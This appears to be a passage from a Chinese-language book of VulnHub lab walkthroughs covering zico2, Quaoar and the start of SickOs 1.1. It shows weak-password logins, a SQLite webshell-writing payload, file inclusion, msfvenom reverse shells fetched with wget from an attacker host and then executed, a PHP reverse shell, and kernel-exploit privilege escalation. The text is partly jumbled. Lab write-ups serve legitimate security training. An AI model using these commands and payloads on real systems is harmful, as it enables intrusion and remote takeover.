在完成这次靶场的过程中，可以有很多发散的思路，比如：
1. 文件包含漏洞，可以使用字典Fuzz一下各种配置文件。
2. 使用NC或者其他反弹shell的姿势反弹shell。
此外，Metasploit Framework有很多方便实用的功能，如果能够掌握，会大大简化渗透的某些步骤，值得深入学
习。
总体来说，此靶场设计比较简单。一个Web，一个SSH，利用点无非这两个，思路比较清晰，便于实践者完成该靶
场。
第九节 zico2
靶机信息
下载链接
https://download.vulnhub.com/zico/zico2.ova
include($file);
?>
运行环境
 本靶机提供了OVA格式的镜像，官方推荐使用virtualbox，从Vulnhub下载之后，导入到viirtualbox即可运
行。
靶机：修改靶机的网络配置为桥接模式。
攻击机：Kali虚拟机，同样使用桥接模式，即可访问靶机。
靶机说明
本靶机的难度为中等。
本靶机的渗透目标为渗透进靶机，拿到root权限，并读取ﬂag文件。
官方提供了一个提示：枚举、枚举、枚举。
信息收集
ip发现
首先看一下Kali的网络配置。
之后使用nmap发现靶机。 nmap -sP 192.168.1.0/24 发现有本网段有四个相关IP。
端口扫描与服务识别
使用nmap快速扫描选项（ -F 参数）扫描 192.168.1.0/24 网段
根据 Mac 可以很明显的区分， 192.168.1.3 为运行在VirtualBox上的虚拟机，即我们构建的靶机。
确定目标IP之后，使用Nmap对目标进行更加详细的探测： nmap -A -v 192.168.1.3 -oN nmap.txt
解释一下相关参数：
-A  详细扫描目标IP，加载所有脚本，尽可能全面的探测信息；
-v  显示详细的扫描过程；
-oN  将扫描结果以普通文本的格式输出到 nmap.txt 。 
结果如下： 
威胁建模
分析nmap的扫描结果，发现靶机开放了 22 和 80 ， 111 端口，系统为 Linux 。 22 端口为 SSH 服务， 80
端口为 http 服务，Web容器为 Apache/2.2.22 。
通常Web会存在各种各样的问题，经过初步分析，以Web作为初步的渗透入口。
Web漏洞挖掘
1. 使用dirb扫描网站目录
dirb http://192.168.1.3
发现敏感目录 dbadmin
2. 目录遍历漏洞
访问 http://192.168.1.3/dbadmin/ ，发现目录遍历了，同时存在 test_db.php 文件。
3. 弱口令
访问 http://192.168.1.3/dbadmin/test_db.php ，发现是类似于MySQL的phpmyadmin，靶机的这个是sqlite的
网页版管理。
尝试弱口令 admin 即可进入。
4. phpLiteAdmin的信息收集
查看原有的数据库，发现里面存在两个账号，使用somd5.com 解密。
得到以下信息：
5. 文件包含漏洞
浏览网站功能，发现一个连接为：http://192.168.1.3/view.php?page=tools.html
猜测存在文件包含漏洞。经过尝试，可以成功包含Linux的passwd文件。
获取Webshell
1. 尝试通过新建数据库getshell
Sqlite数据库一般应用在很多嵌入式设备当中，属于单文件的数据库，类似于Access数据库。这里尝试新建一个名
为 shell.php 的数据库文件，对应的会生成shell.php的一个文件。但是观察到数据库文件的路径
在 /usr/databases/test_users
那么，尝试新建一个数据库名为 ../../var/www/html/shell.php 。
新建成功，但是发现过滤掉了 / 。此方法失败，但留作记录，算是一个突破点。
2. 尝试导出文件getshell
payload: ATTACH DATABASE '/var/www/html/shell.php' AS test ;create TABLE test.exp (dataz text) ;
insert INTO test.exp (dataz) VALUES ('');
通过这种方式写文件，适用于以下场景：
1. 可直接访问数据库执行SQL语句。
2. 堆叠查询选项启用（默认关闭）
执行失败，放弃这个点。
3. 利用phpliteadmin和文件包含漏洞getshell
经过前期的尝试，发现了文件包含漏洞和数据库权限。两者结合，即可getshell。方法如下：
1. 通过phpliteadmin新加一条数据，写入数据库文件。
root 34kroot34
zico zico2215@
2. 利用文件包含漏洞包含数据库文件getshell。
4. 种植Meterpreter shell
首先生成一个msf的可执行木马。
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f elf > ~/Desktop/msf.elf
之后使用Python搭建一个简单的Web Server： python -m SimpleHTTPServer 80
之后利用前面获得的一句话，执行命令，下载生成的木马，并且运行。
下载木马： x=system('wget http://192.168.1.4:9999/msf.elf');
之后 x=system('ls');  发现并没有保存，推测是因为权限问题。那么，直接下载到 /tmp 目录
x=system('wget http://192.168.1.4:9999/msf.elf -O /tmp/msf.elf');
查看一下：
之后添加执行权限并且运行。
结果如下：
提升权限
Linux提权的基本思路：
1. 使用msf提权
use post/multi/recon/local_exploit_suggester
没有发现可以利用的提权漏洞。
2. 溢出提权
现在拿到了目标靶机的Meterpreter shell，简单的看下信息。
发现系统为 Ubuntu 12.04 (Linux 3.2.0-23-generic) 。到 www.exploit-db.com 搜索对应的exp。
这里使用第二个EXP。地址为： https://www.exploit-db.com/exploits/33589/
x=system('chmod +x /tmp/msf.elf');
x=system('/tmp/msf.elf');
使用方法：
首先使用Meterpreter的shell把C代码写入：
进入shell，使用Python spawn一个shell。 python -c 'import pty;pty.spawn("/bin/bash")' 。
之后编译执行exp。
获取ﬂag
在root的家目录发现了 flag.txt 文件： 
靶场思路回顾
至此，已经完成最终目标，回头分析一下之前几个失败的点。
1. 使用phpliteadmin写马失败原因
发现网站的根目录为 /var/www 而不是 /var/www/html ，其次 www 目录的权限问题，不能直接写shell。
但是 /var/www/ 下的其他目录，权限设置的非常大，可以直接写shell。
2.再次利用phpliteadmin写马尝试getshell
在以上基础上，我们知道了网站的绝对路径，且网站目录的其他文件夹权限设置有问题。
尝试写shell：
成功写入：
思路总结
突破点总结：
1. phpliteadmin登陆弱口令
2. 通过phpliteadmin向数据库文件写入一句话木马
3. 利用LFI和数据库文件getshell
4. MSF生成木马，利用一句话寻找可写目录植入、运行
5. 利用系统漏洞提权为root
在完成这次靶场的过程中，可以有很多发散的思路，比如：
1. 文件包含漏洞，可以使用字典Fuzz一下各种配置文件和日志文件。比如通过包含SSH日志的方式getshell。
2. Fuzz一下网站的绝对路径，利用phpliteadmin写shell。
总体来说，此靶场很有意思。既考察了Web基本的漏洞、phpliteadmin的组合利用，也考察了目录权限设置的知
识点。可以有多种方式完成，可玩性高。
第十节 Quaoar
靶机信息
下载链接
https://download.vulnhub.com/hackfest2016/Quaoar.ova
运行环境
 本靶机提供了OVA格式的镜像，官方推荐使用virtualbox，从Vulnhub下载之后，导入到viirtualbox即可运
行。
靶机：修改靶机的网络配置为桥接模式。
攻击机：Kali虚拟机，同样使用桥接模式，即可访问靶机。
靶机说明
本靶机的难度为初学者。
本靶机的渗透目标为渗透进靶机，找到ﬂag，并拿到root权限。
作者推荐工具 nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra
信息收集
ip发现
首先看一下Kali的网络配置。
靶机IP机器直接说明
端口扫描与服务识别
确定目标IP之后，使用Nmap对目标进行更加详细的探测： nmap -A -v 192.168.1.3 -oN nmap.txt
解释一下相关参数：
-A  详细扫描目标IP，加载所有脚本，尽可能全面的探测信息；
-v  显示详细的扫描过程；
-oN  将扫描结果以普通文本的格式输出到 nmap.txt 。 
结果如下： 
威胁建模
分析nmap的扫描结果，发现靶机开放了 22 和 80 端口，系统为 Linux 。 22 端口为 SSH 服务， 80 端口为
http 服务，Web容器为 Apache/2.2.22 。
通常Web会存在各种各样的问题，经过初步分析，以Web作为初步的渗透入口。
Web漏洞挖掘
1. 使用dirb扫描网站目录
dirb http://172.19.0.182
发现robots.txt，upload目录，wordpress目录。
查看robots.txt，指向的也是wordpress目录
2. 弱口令
利用wpscan进行扫描
尝试弱口令 admin admin 即可进入。
获取Webshell
1. 尝试通过修添加获得shell
cp /usr/share/webshells/php/php-reverse-shell.php shelly.php
对shell进行修改，然后本地开NC进行监听，访问一个不存在的页面，得到shell
利用python获得一个新shell
`python -c 'import pty; pty.spawn("/bin/bash")'
在该权限下，获取第一个shell
提升权限
1. 查看应用密码尝试弱口令
wpscan -u http://172.19.0.182/wordpress --wp-content-dir wp-content --enumerate u
[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username 'admin' is still used
[+] Finished: Fri Jul  6 22:13:24 2018
[+] Requests Done: 62
[+] Memory used: 63.867 MB
[+] Elapsed time: 00:00:05
查看wordpress的配置文件
发现root的账号密码
得到root权限
拿到另一个ﬂag
第十一节 SickOs 1.1
靶机信息
下载链接
https://download.vulnhub.com/sickos/sick0s1.1.7z
运行环境
 本靶机提供了OVF格式的镜像，官方推荐使用VMware Workstation，从Vulnhub下载之后，导入到VMware 
Workstation即可运行。
靶机：NAT自动获取IP。
攻击机：NAT自动获取IP：192.168.202.128。
靶机说明
本靶机目的是拿到root权限，读取/root/a0216ea4d51874464078c618298b1367.txt文件。
信息收集
ip发现
靶机所处网段是192.168.202.1/24，使用nmap扫描获取靶机IP：192.168.202.133。
端口扫描与服务识别 
对该IP全端口扫描如下：
发现使用squid代理。尝试设置浏览器代理，访问http://192.168.202.133/： 
 初
步得到结果是通过挂代理对靶机IP进行漏洞挖掘。
Web漏洞挖掘
设置代理进行目录爆破：
访问robots.txt:
发现是wolfcms，前台都是一些静态页面，无可利用点。
默认地址http://192.168.202.133/wolfcms/?/admin/进入管理后台： 
尝试使用admin/admin弱口令进入后台，从提示信息可以看出cms版本<0.8.3.1,可能存在文件上传漏洞：
获取webshell